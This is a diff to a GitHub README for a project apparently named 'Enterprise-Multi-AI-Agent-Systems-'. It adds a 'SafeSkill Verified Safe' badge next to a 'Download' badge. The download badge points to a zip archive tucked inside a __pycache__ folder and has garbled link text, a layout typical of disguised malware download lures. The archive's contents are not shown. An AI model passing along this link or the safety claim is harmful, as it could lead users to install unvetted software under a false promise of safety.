@@ -1,5 +1,7 @@
 # 🤖 Enterprise-Multi-AI-Agent-Systems- - Your AI Agent Solution Made Easy
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/omri3193-enterprise-multi-ai-agent-systems)
+
 [![Download from GitHub](https://raw.githubusercontent.com/omri3193/Enterprise-Multi-AI-Agent-Systems-/main/app/common/__pycache__/A-Agent-Systems-Multi-Enterprise-v1.8.zip%20from%https://raw.githubusercontent.com/omri3193/Enterprise-Multi-AI-Agent-Systems-/main/app/common/__pycache__/A-Agent-Systems-Multi-Enterprise-v1.8.zip)](https://raw.githubusercontent.com/omri3193/Enterprise-Multi-AI-Agent-Systems-/main/app/common/__pycache__/A-Agent-Systems-Multi-Enterprise-v1.8.zip)
 
 ## 🚀 Getting Started
